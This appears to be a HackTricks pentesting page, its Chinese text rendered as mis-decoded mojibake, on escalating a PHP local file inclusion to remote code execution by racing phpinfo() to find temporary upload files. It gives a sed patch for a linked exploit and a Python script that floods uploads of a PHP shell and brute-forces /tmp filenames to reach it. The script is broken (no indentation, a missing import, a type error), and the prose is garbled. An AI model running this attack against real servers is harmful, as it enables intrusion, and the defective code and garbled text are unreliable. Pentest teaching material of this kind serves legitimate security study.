<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**å—ï¼ŸæŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsé›†åˆ**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ‚¨éœ€è¦ï¼š**ä¸€ä¸ªLFIæ¼æ´ï¼Œä¸€ä¸ªæ˜¾ç¤ºphpinfo()çš„é¡µé¢ï¼Œ"file\_uploads = on"ï¼Œå¹¶ä¸”æœåŠ¡å™¨èƒ½å¤Ÿåœ¨"/tmp"ç›®å½•ä¸­å†™å…¥ã€‚**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**HTBæ•™ç¨‹**ï¼š[https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

æ‚¨éœ€è¦ä¿®å¤æ¼æ´ï¼ˆå°†**=>**æ›´æ”¹ä¸º**=>**ï¼‰ã€‚ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥ï¼š
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
### ç†è®º

å¦‚æœ PHP å…è®¸ä¸Šä¼ æ–‡ä»¶ï¼Œå°è¯•ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œè¿™äº›æ–‡ä»¶ä¼šè¢«å­˜å‚¨åœ¨ä¸´æ—¶ç›®å½•ä¸­ï¼Œç›´åˆ°æœåŠ¡å™¨å¤„ç†å®Œè¯·æ±‚ï¼Œç„¶åè¿™ä¸ªä¸´æ—¶æ–‡ä»¶ä¼šè¢«åˆ é™¤ã€‚

ç„¶åï¼Œå¦‚æœä½ åœ¨ web æœåŠ¡å™¨ä¸Šå‘ç°äº† LFI æ¼æ´ï¼Œä½ å¯ä»¥å°è¯•çŒœæµ‹åˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶çš„åç§°ï¼Œå¹¶åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰è®¿é—®å®ƒæ¥åˆ©ç”¨ RCEã€‚

åœ¨ **Windows** ä¸­ï¼Œæ–‡ä»¶é€šå¸¸å­˜å‚¨åœ¨ **C:\Windows\temp\php<<**

åœ¨ **linux** ä¸­ï¼Œæ–‡ä»¶åé€šå¸¸æ˜¯ **éšæœº** çš„ï¼Œå¹¶ä½äº **/tmp**ã€‚ç”±äºæ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œéœ€è¦ **ä»æŸå¤„æå–ä¸´æ—¶æ–‡ä»¶çš„åç§°** å¹¶åœ¨å®ƒè¢«åˆ é™¤ä¹‹å‰è®¿é—®å®ƒã€‚è¿™å¯ä»¥é€šè¿‡è¯»å–å‡½æ•° "**phpconfig()**" å†…å®¹ä¸­çš„ **å˜é‡ $\_FILES** çš„å€¼æ¥å®Œæˆã€‚

**phpinfo()**

**PHP** ä½¿ç”¨ **4096B** çš„ç¼“å†²åŒºï¼Œå½“å®ƒ **æ»¡äº†**ï¼Œå°±ä¼š **å‘é€ç»™å®¢æˆ·ç«¯**ã€‚ç„¶åå®¢æˆ·ç«¯å¯ä»¥ **å‘é€å¾ˆå¤šå¤§çš„è¯·æ±‚**ï¼ˆä½¿ç”¨å¤§çš„å¤´éƒ¨ï¼‰**ä¸Šä¼ ä¸€ä¸ª php** åå‘ **shell**ï¼Œç­‰å¾… **phpinfo() çš„ç¬¬ä¸€éƒ¨åˆ†è¿”å›**ï¼ˆå…¶ä¸­åŒ…å«ä¸´æ—¶æ–‡ä»¶çš„åç§°ï¼‰ï¼Œå¹¶å°è¯•åœ¨ php æœåŠ¡å™¨åˆ é™¤æ–‡ä»¶ä¹‹å‰ **è®¿é—®ä¸´æ—¶æ–‡ä»¶**ï¼Œåˆ©ç”¨ LFI æ¼æ´ã€‚

**Python è„šæœ¬å°è¯•æš´åŠ›ç ´è§£åç§°ï¼ˆå¦‚æœé•¿åº¦ = 6ï¼‰**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼ŸæŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsé›†åˆ**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitterä¸Š**[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**å…³æ³¨æˆ‘**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
